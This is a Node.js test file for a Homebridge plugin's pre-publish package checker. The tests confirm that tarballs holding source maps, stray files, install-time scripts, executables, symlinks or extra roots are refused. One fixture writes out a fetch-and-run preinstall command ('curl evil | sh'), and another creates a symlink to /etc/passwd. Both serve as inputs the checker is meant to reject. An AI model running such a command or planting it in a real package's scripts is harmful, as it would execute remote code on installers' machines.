'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const { execFileSync } = require('node:child_process');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { checkEntries, checkTarball } = require('../scripts/check-pack.js');

const PKG = { name: 'homebridge-plugin-klares4', main: 'dist/index.js', scripts: { build: 'tsc' } };
const GOOD = [
    'package.json', 'README.md', 'CHANGELOG.md', 'LICENSE', 'config.schema.json',
    'dist/index.js', 'dist/index.d.ts', 'dist/platform/index.js', 'dist/platform/index.d.ts',
];

test('a package with the runtime, declarations and the documented root files passes', () => {
    assert.deepEqual(checkEntries(GOOD, PKG), []);
});

test('source maps are refused, whatever they point at', () => {
    const problems = checkEntries([...GOOD, 'dist/index.js.map', 'dist/index.d.ts.map'], PKG);
    assert.deepEqual(problems, [
        'source map in the package: dist/index.js.map',
        'source map in the package: dist/index.d.ts.map',
    ]);
});

test('files outside dist and the documented root files are refused', () => {
    const problems = checkEntries([...GOOD, 'src/index.ts', 'test/x.test.js', '.env', 'config.json'], PKG);
    assert.deepEqual(problems.map((p) => p.replace('unexpected file in the package: ', '')), [
        'src/index.ts', 'test/x.test.js', '.env', 'config.json',
    ]);
});

test('dist holds compiled modules and declarations only', () => {
    const extra = [
        'dist/.npmrc', 'dist/install.sh', 'dist/native.node', 'dist/data.json', 'dist/.hidden/x.js',
        'dist/klares4-debug.json', 'dist/prg-1.ksa', 'dist/index.ts',
    ];
    const problems = checkEntries([...GOOD, ...extra], PKG);
    assert.deepEqual(problems.map((p) => p.replace('unexpected file in the package: ', '')), extra);
});

test('a missing entry point or declaration is reported', () => {
    const entries = GOOD.filter((e) => e !== 'dist/index.js' && e !== 'LICENSE');
    assert.deepEqual(checkEntries(entries, PKG).sort(), [
        'missing from the package: LICENSE',
        'missing from the package: dist/index.js',
    ]);
});

test('install-time lifecycle scripts are refused', () => {
    const problems = checkEntries(GOOD, { ...PKG, scripts: { postinstall: 'node x.js', prepack: 'tsc' } });
    assert.deepEqual(problems, ['package.json defines the install-time script "postinstall"']);
    for (const script of ['preinstall', 'install', 'postinstall', 'preprepare', 'prepare', 'postprepare']) {
        assert.deepEqual(checkEntries(GOOD, { ...PKG, scripts: { [script]: 'x' } }),
            [`package.json defines the install-time script "${script}"`], script);
    }
});

test('native builds at install and executables are refused', () => {
    assert.deepEqual(checkEntries(GOOD, { ...PKG, gypfile: true }), ['package.json sets "gypfile": npm would build native code at install']);
    assert.deepEqual(checkEntries(GOOD, { ...PKG, bin: { klares4: 'dist/index.js' } }), ['package.json declares executables ("bin")']);
    assert.deepEqual(checkEntries(GOOD, { ...PKG, directories: { bin: 'dist' } }), ['package.json declares executables ("bin")']);
});

test('dist files without a source file are reported as stale output', () => {
    const { orphanedDistEntries } = require('../scripts/check-pack.js');
    const sources = new Set(['index.ts', 'platform/index.ts']);
    const entries = [
        'dist/index.js', 'dist/index.d.ts', 'dist/platform/index.js', 'dist/platform/index.d.ts',
        'dist/telemetry.js', 'dist/telemetry.d.ts', 'package.json',
    ];
    assert.deepEqual(orphanedDistEntries(entries, (rel) => sources.has(rel)), ['dist/telemetry.js', 'dist/telemetry.d.ts']);
});

// checkTarball on real tarballs: what the release workflow runs on the file it publishes.
function tarballFixture(t, edit = () => {}, roots = ['package']) {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'klares4-pack-test-'));
    t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
    const pkgDir = path.join(dir, 'package');
    const src = path.join(dir, 'src');
    fs.mkdirSync(path.join(pkgDir, 'dist'), { recursive: true });
    fs.mkdirSync(src);
    fs.writeFileSync(path.join(src, 'index.ts'), 'export {};\n');
    const files = {
        'package.json': JSON.stringify(PKG), 'README.md': '#', 'CHANGELOG.md': '#', LICENSE: 'MIT',
        'config.schema.json': '{}', 'dist/index.js': '"use strict";\n', 'dist/index.d.ts': 'export {};\n',
    };
    for (const [file, content] of Object.entries(files)) fs.writeFileSync(path.join(pkgDir, file), content);
    edit(pkgDir, dir);
    const tarball = path.join(dir, 'pkg.tgz');
    execFileSync('tar', ['-czf', tarball, '-C', dir, ...roots]);
    const workdir = fs.mkdtempSync(path.join(dir, 'work-'));
    return checkTarball(tarball, { srcRoot: src, workdir });
}

test('checkTarball accepts a clean package', (t) => {
    const { problems, entries } = tarballFixture(t);
    assert.deepEqual(problems, []);
    assert.equal(entries.length, 7);
});

test('checkTarball refuses a script that still points at a source map', (t) => {
    const { problems } = tarballFixture(t, (pkg) => fs.appendFileSync(path.join(pkg, 'dist/index.js'), '//# sourceMappingURL=index.js.map\n'));
    assert.deepEqual(problems, ['dist/index.js still points at a source map that is not published']);
});

test('checkTarball refuses an invalid config.schema.json and stale dist output', (t) => {
    const { problems } = tarballFixture(t, (pkg) => {
        fs.writeFileSync(path.join(pkg, 'config.schema.json'), '{');
        fs.writeFileSync(path.join(pkg, 'dist/telemetry.js'), '');
    });
    assert.equal(problems.length, 2);
    assert.match(problems[0], /dist\/telemetry\.js has no source file in src\//);
    assert.match(problems[1], /config\.schema\.json is not valid JSON/);
});

test('checkTarball refuses an install script declared in the shipped package.json', (t) => {
    const { problems } = tarballFixture(t, (pkg) => fs.writeFileSync(path.join(pkg, 'package.json'),
        JSON.stringify({ ...PKG, scripts: { preinstall: 'curl evil | sh' } })));
    assert.deepEqual(problems, ['package.json defines the install-time script "preinstall"']);
});

test('checkTarball refuses links before extracting anything', (t) => {
    const { problems } = tarballFixture(t, (pkg) => fs.symlinkSync('/etc/passwd', path.join(pkg, 'dist/link.js')));
    assert.equal(problems.length, 1);
    assert.match(problems[0], /^not a regular file in the package: l.*dist\/link\.js -> \/etc\/passwd$/);
});

test('checkTarball refuses members outside package/', (t) => {
    const { problems } = tarballFixture(t, (pkg, dir) => {
        fs.mkdirSync(path.join(dir, 'extra'));
        fs.writeFileSync(path.join(dir, 'extra', 'x.js'), '');
    }, ['package', 'extra']);
    assert.deepEqual(problems, ['the tarball must contain only package/, found: extra, package']);
});
